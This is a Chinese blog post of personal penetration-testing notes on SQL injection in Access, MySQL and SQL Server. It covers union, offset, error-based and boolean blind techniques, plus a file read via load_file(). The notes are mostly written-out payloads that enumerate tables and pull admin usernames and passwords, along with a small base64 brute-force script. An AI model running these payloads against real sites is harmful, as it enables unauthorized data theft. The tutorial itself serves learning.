<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>渗透 | LX3820</title><meta name="author" content="Wch"><meta name="copyright" content="Wch"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="sql 注入access数据库：Access数据库是一种小型数据库用于储存数据，其中各个对象之间可以建立关联，方便用户快速查询与调用数据。它相对其他数据库来说比较简单，只有&#x3D;&#x3D;一个数据库&#x3D;&#x3D;，里面存放着表、列以及数据，通过简单的语句就可以完成注入。 123456789结构：数据库名​         表名​              列名​">
<meta property="og:type" content="article">
<meta property="og:title" content="渗透">
<meta property="og:url" content="http://lx3820.github.io/2024/03/15/%E6%B8%97%E9%80%8F/index.html">
<meta property="og:site_name" content="LX3820">
<meta property="og:description" content="sql 注入access数据库：Access数据库是一种小型数据库用于储存数据，其中各个对象之间可以建立关联，方便用户快速查询与调用数据。它相对其他数据库来说比较简单，只有&#x3D;&#x3D;一个数据库&#x3D;&#x3D;，里面存放着表、列以及数据，通过简单的语句就可以完成注入。 123456789结构：数据库名​         表名​              列名​">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://wch3820.oss-cn-hongkong.aliyuncs.com/img/1.jpeg">
<meta property="article:published_time" content="2024-03-15T00:28:01.000Z">
<meta property="article:modified_time" content="2024-04-24T07:16:39.187Z">
<meta property="article:author" content="Wch">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wch3820.oss-cn-hongkong.aliyuncs.com/img/1.jpeg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://lx3820.github.io/2024/03/15/%E6%B8%97%E9%80%8F/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '渗透',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-04-24 15:16:39'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/iconfont.css" media="defer" οnlοad="this.media='all'"><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wch3820.oss-cn-hongkong.aliyuncs.com/img/1.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://wch3820.oss-cn-hongkong.aliyuncs.com/img/1.jpeg')"><nav id="nav"><span id="blog-info"><a href="/" title="LX3820"><span class="site-name">LX3820</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">渗透</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-03-15T00:28:01.000Z" title="发表于 2024-03-15 08:28:01">2024-03-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-04-24T07:16:39.187Z" title="更新于 2024-04-24 15:16:39">2024-04-24</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="渗透"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="sql-注入"><a href="#sql-注入" class="headerlink" title="sql 注入"></a><strong>sql 注入</strong></h1><h4 id="access数据库："><a href="#access数据库：" class="headerlink" title="access数据库："></a><strong>access数据库：</strong></h4><p><strong>Access数据库是一种小型数据库用于储存数据，其中各个对象之间可以建立关联，方便用户快速查询与调用数据。它相对其他数据库来说比较简单，只有&#x3D;&#x3D;一个数据库&#x3D;&#x3D;，里面存放着表、列以及数据，通过简单的语句就可以完成注入。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">结构：</span><br><span class="line"></span><br><span class="line">数据库名</span><br><span class="line"></span><br><span class="line">​         表名</span><br><span class="line"></span><br><span class="line">​              列名</span><br><span class="line"></span><br><span class="line">​                   数据</span><br></pre></td></tr></table></figure>

<p><strong>联合注入</strong></p>
<p><strong>1, 判断注入点，一般来说单引号、减号、and等就可以判断是否存在注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;   //通过单引号看是否报错，根据报错信息，判断数据库闭合方式</span><br><span class="line">?id=2-1  //返回与id=2不同的页面说明带入数据库执行，存在注入</span><br></pre></td></tr></table></figure>

<p><strong>2,  通过order by 判断字段数，将字段数从小到大以此类推，直至返回错误页面，而正确的字段数就是返回错误的字段数减一</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1 order by 1	</span><br><span class="line">...</span><br><span class="line">?id=1 order by 10 //如果报错则字段为9</span><br></pre></td></tr></table></figure>

<p><strong>3, 通过联合查询</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from article where id= 1 union select 1,[column_name],3 from [table_name]</span><br><span class="line"></span><br><span class="line">如：1 union select 1,username,password,4,5,6,7,8,9,10 from admin</span><br></pre></td></tr></table></figure>

<p><strong>偏移注入（已知表名，未知列名）</strong></p>
<p><strong>1，利用联合注入查询字段数量，例：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1 order by 1	</span><br><span class="line">...</span><br><span class="line">?id=1 order by 10 //如果报错则字段为9</span><br><span class="line">?id=1 order by 1,2,3,4,5,6,7,8,9 from admin</span><br></pre></td></tr></table></figure>

<p><strong>2，测偏移量，将9改为*号，测试是否回显正常，不正常就逐渐往下减，直到正常位置。例：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 order by 1,2,3,4,5,6,* from admin  //显示正常</span><br><span class="line">代表admin的字段数为3;</span><br></pre></td></tr></table></figure>

<p><em><em>将语句修改为：UNION SELECT 1,2,3,</em> from (admin as a inner join admin as b on a.id&#x3D;b.id)</em>*<br><strong>admin表变成了(admin as a inner join admin as b on a.id&#x3D;b.id)，这里是将admin重命名为了a和b两张表，然后通过inner join 将a表和b表的id相同字段展示出来，a表和b表本来都是admin表，所以id肯定都是相同的（这里要提醒一下，id这个字段可以换成其它字段，但是一定得存在，一般admin表中都存在id字段的），这样做的目的就是可以打乱顺序来爆出其它字段</strong><br><strong>但是由于增加了一张表，所以字段数得再减少一个*号的长度，所以就从6变成了3。</strong></p>
<h4 id="MYSQL数据库"><a href="#MYSQL数据库" class="headerlink" title="MYSQL数据库"></a><strong>MYSQL数据库</strong></h4><ol>
<li><p><strong>了解数据库结构</strong></p>
<p><strong>一个网站就对应一个数据库：</strong></p>
<p><strong>数据库构成：</strong></p>
<p>​            <strong>数据库名</strong></p>
<p>​                     <strong>表名</strong></p>
<p>​                          <strong>列名</strong></p>
<p>​                              <strong>数据</strong></p>
</li>
<li><p><strong>在mysql5.0以上的版本中，mysql存在一个自带的数据库名为information_schema, 他是存储记录所有的数据库名，表名，列名的数据库，也相当于可以通过查询他获取指定数据库下面的表名或列名信息。</strong></p>
</li>
<li><p><strong>信息收集：数据库版本：version()</strong></p>
<p>​                   <strong>数据库名字：database()</strong></p>
<p>​                   <strong>数据库用户：user()</strong></p>
<p>​                   <strong>操作系统：@@version_compile_os</strong></p>
</li>
<li><p><strong>数据库中的  “.” 代表下一级，如: lx.user:  表示 lx 数据库下的 user表名字</strong></p>
<p>​         <strong>information_schema.tables : 记录所有表名信息的表。</strong></p>
</li>
</ol>
<p>​                <strong>information_schema.columns ：记录所有列名信息的表。</strong></p>
<p>​                <strong>table_name : 表名</strong></p>
<p>​                <strong>column_name: 列名</strong></p>
<p>​                <strong>table_schema: 数据库名</strong></p>
<p><strong>判断注入：第一步：判断是否存在注入</strong></p>
<p>​                   <strong>第二步：判断注入参数</strong></p>
<p>​                   <strong>第三步：判断输入类型</strong></p>
<ol start="5">
<li><ol>
<li><strong>确定注入点是否可注入</strong></li>
<li><strong>确定表的查询列数：相关语句：<a target="_blank" rel="noopener" href="https://lx.com/?id=1">https://lx.com/?id=1</a> order by number.</strong></li>
<li><strong>列出所有数据库 <a target="_blank" rel="noopener" href="https://lx.com/?id=-1">https://lx.com/?id=-1</a> union select 1,2,3    查看回显位，可以在选中回显位进行查询数据库版本，名字，用户，操作系统。</strong><ol>
<li><strong>列出所有表 ： <a target="_blank" rel="noopener" href="https://lx.com/?id=-1">https://lx.com/?id=-1</a> union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’数据库名’</strong></li>
</ol>
</li>
<li><strong><a target="_blank" rel="noopener" href="https://lx.com/?id=-1">https://lx.com/?id=-1</a> union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’你想要的表名’</strong></li>
<li><strong>得到数据：<a target="_blank" rel="noopener" href="https://lx.com/?id=-1">https://lx.com/?id=-1</a> union select 1,2,group_concat(列名(数据)) from 列</strong></li>
</ol>
</li>
</ol>
<p><strong>脚本爆破：</strong>admin,admin_login,article,bills,block,cat,hc_admin,hc_dictionary,hc_hdimg,hc_huiyuan,hc_imgshow,hc_links,hc_liuyan,hc_news,hc_product,hc_shangpin,hc_text,hc_zhaopin,order,otherinfo,payorder,qr_code,smscode,test,user,userinfo,user</p>
<p><strong>例如：爆破base64加密脚本</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;&#x27;</span></span><br><span class="line">sqli=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> lieming <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;文件名&#x27;</span>):</span><br><span class="line">    lieming=lieming.strip()</span><br><span class="line">    sqli=sqlin+lieming</span><br><span class="line">    urls=url+base64.b64encode(sqli.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    s=requests.get(urls).content</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(s))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">#s=requests.get(urls)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">in</span> s.text:</span><br><span class="line">         <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure>

<h4 id="sqlserver数据库"><a href="#sqlserver数据库" class="headerlink" title="sqlserver数据库"></a><strong>sqlserver数据库</strong></h4><p><strong>1，报错语句：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">user</span> <span class="operator">&gt;</span><span class="number">0</span>            <span class="operator">/</span><span class="operator">/</span>获取当前数据库用户名</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> db_name<span class="operator">&gt;</span><span class="number">0</span>    <span class="operator">/</span><span class="operator">/</span>获取当前数据库名称</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="number">1</span>) <span class="keyword">from</span> [sysobjects])<span class="operator">&gt;=</span><span class="number">0</span>   <span class="operator">/</span><span class="operator">/</span>当前数据库名</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> @<span class="variable">@servername</span>)        <span class="operator">/</span><span class="operator">/</span>本地服务名</span><br></pre></td></tr></table></figure>

<p><strong>2，判断注入点：</strong></p>
<p><strong>3，判断字段数：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> 判断字段数</span><br></pre></td></tr></table></figure>

<p><strong>4，暴库</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>使用联合查询，需要注意的是，使用联合查询时需要前面不可查询，可以将参数<span class="number">2</span>改为<span class="number">-2</span>，也可以构造 <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> 两种方式都可以。为了避免出现错误，四个字段，都用 <span class="keyword">null</span> 代替，构造如下语句</span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,unll,unll  </span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>然后用数字依次代替，判断回显位置，发现第二个字段显示在页面中，将第二个<span class="keyword">null</span> 替换为 (<span class="keyword">select</span> db_name()),具体语句为</span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> db_name()), <span class="keyword">null</span>, <span class="keyword">null</span> </span><br></pre></td></tr></table></figure>

<p><strong>5，暴表</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>知道数据库名后，构造如下语句，爆出表名</span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> 库名.dbo.sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;u&#x27;</span>), <span class="keyword">null</span>,<span class="keyword">null</span></span><br></pre></td></tr></table></figure>

<p><strong>6，暴字段</strong></p>
<p><strong>通过构造如下语句，可以爆出所有字段，</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> top <span class="number">1</span> col_name(object_id(<span class="string">&#x27;manage&#x27;</span>),<span class="number">1</span>) <span class="keyword">from</span> sysobjects), <span class="keyword">null</span>,<span class="keyword">null</span></span><br></pre></td></tr></table></figure>

<p><strong>7，获取数据</strong></p>
<p><strong>通过构造如下语句</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> top <span class="number">1</span> username <span class="keyword">from</span> manage),<span class="keyword">null</span>,<span class="keyword">null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> top <span class="number">1</span> password <span class="keyword">from</span> manage),<span class="keyword">null</span>,<span class="keyword">null</span></span><br></pre></td></tr></table></figure>

<p>#####<strong>偏移注入（略）</strong></p>
<h4 id="数据库文件读写"><a href="#数据库文件读写" class="headerlink" title="数据库文件读写"></a><strong>数据库文件读写</strong></h4><p><strong>load_file() 语句：select load_file(‘文件路径’)；可以配合sql语句进行文件的读取：</strong></p>
<p><strong>例如：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>blog<span class="operator">/</span>carryfile<span class="operator">/</span>news.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,load_file(<span class="string">&#x27;d:/1.txt&#x27;</span>),<span class="number">3</span>,<span class="number">4</span></span><br></pre></td></tr></table></figure>

<p><strong><img src="https://wch3820.oss-cn-hongkong.aliyuncs.com/img/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99.png" alt="image-20240408225211009"></strong></p>
<p><strong>成功读取文件内容：1234</strong></p>
<p><strong>隐藏页面特效</strong></p>
<h1 id><a href="#" class="headerlink" title></a></h1><p>####<strong>SQL注入之盲注简单总结</strong></p>
<p><strong>本文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42477007/article/details/96492174">https://blog.csdn.net/qq_42477007/article/details/96492174</a></strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<ol>
<li><strong>什么是盲注？</strong><br><strong>盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</strong></li>
<li><strong>SQL盲注与SQL普通注入的区别？</strong><br><strong>普通注入是可以根据报错提示，进行sql语句注入从而，直接爆出我们想要的信息，比如数据库版本、数据库名、用户名、操作系统版本等；而盲注只能通过多次猜测，从而猜解出有用信息。相对来说sql盲注更加考验安全人员的手注能力。</strong></li>
<li><strong>SQL盲注分类：</strong><br><strong>Sql盲注可以简单分为三类 ：布尔盲注、延时盲注和报错盲注</strong></li>
</ol>
<p><strong>什么是布尔盲注？</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> 布尔（Boolean）型是计算机里的一种数据类型，只有True（真）和False（假）两个值。一般也称为逻辑型。</span><br><span class="line"> 页面在执行sql语句后，只显示两种结果，这时可通过构造逻辑表达式的sql语句来判断数据的具体内容。</span><br><span class="line">12</span><br></pre></td></tr></table></figure>

<p><strong>布尔注入用到的函数：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mid(str,start,length)  :字符串截取</span><br><span class="line">ORD()                  :转换成ascii码</span><br><span class="line">Length()               :统计长度</span><br><span class="line">version()              :查看数据库版本</span><br><span class="line">database()             :查看当前数据库名</span><br><span class="line">user()                 :查看当前用户</span><br><span class="line">123456</span><br></pre></td></tr></table></figure>

<p><strong>布尔注入流程：</strong><br><strong>猜解获取数据库长度</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or length(database()) &gt; 8 --+    :符合条件返回正确，反之返回错误</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p><strong>猜解数据库名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or mid(database(),1,1)= &#x27;z&#x27; --+    :因为需要验证的字符太多，所以转化为ascii码验证</span><br><span class="line">&#x27;or ORD(mid(database(),1,1)) &gt; 100 --+ :通过确定ascii码，从而确定数据库名</span><br><span class="line">12</span><br></pre></td></tr></table></figure>

<p><strong>猜解表的总数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()) = 2  --+   :判断表的总数</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p><strong>猜解第一个表名的长度</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1) = 5 --+</span><br><span class="line">&#x27;or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,1) = 5 --+ （第二个表）</span><br><span class="line">12</span><br></pre></td></tr></table></figure>

<p><strong>猜解第一个表名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or mid((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit      0,1 ),1,1) = &#x27;a&#x27;  --+</span><br><span class="line">或者</span><br><span class="line">&#x27;Or ORD(mid(select TABLE_NAME from information_schema.TABLES where </span><br><span class="line">TABLE_SCHEMA = database() limit 0,1),1,1)) &gt;100   --+</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>

<p><strong>猜解表的字段的总数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or (select count(column_name) from information_schema.COLUMNS where TABLE_NAME=&#x27;表名&#x27;) &gt; 5 --+</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p><strong>猜解第一个字段的长度</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME=&#x27;表名&#x27; limit 0,1) = 10 --+</span><br><span class="line">&#x27;or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME=&#x27;表名&#x27; limit 1,1) = 10 --+ （第二个字段）</span><br><span class="line">12</span><br></pre></td></tr></table></figure>

<p><strong>猜解第一个字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = &#x27;表名&#x27; limit 0,1),1,1) = &#x27;i&#x27; --+</span><br><span class="line">或者</span><br><span class="line">&#x27;or ORD(mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = &#x27;表名&#x27; limit 0,1),1,1)) &gt; 100 --+</span><br><span class="line">123</span><br></pre></td></tr></table></figure>

<p><strong>猜解直接猜测字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or (select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;表名&#x27; limit 1,1) = &#x27;username&#x27; --+</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p><strong>猜解内容长度</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">假如已经知道字段名为  id   username password</span><br><span class="line">&#x27;or (select Length(concat(username,&quot;---&quot;,password)) from admin limit 0,1) = 16  --+</span><br><span class="line">12</span><br></pre></td></tr></table></figure>

<p><strong>猜解内容</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or mid((select concat(username,&quot;-----&quot;,password) from admin limit 0,1),1,1) = &#x27;a&#x27; --+</span><br><span class="line">或者</span><br><span class="line">&#x27;or ORD(mid((select concat(username,&quot;-----&quot;,password) from admin limit 0,1),1,1)) &gt; 100 --+    ASCII码猜解</span><br><span class="line">123</span><br></pre></td></tr></table></figure>

<p><strong>也可以直接猜测内容</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or (Select concat(username,&quot;-----&quot;,password) from admin limit 0,1 ) = &#x27;admin-----123456&#x27;   --+</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p><strong>什么是延迟盲注？</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> 提交对执行时间敏感的函数sql语句，通过执行时间的长短来判断是否执行成功，比如:正确的话会导致时间很长，错误的话会导致执行时间很短，这就是所谓的延迟盲注</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p><strong>延迟盲注需要的函数：</strong></p>
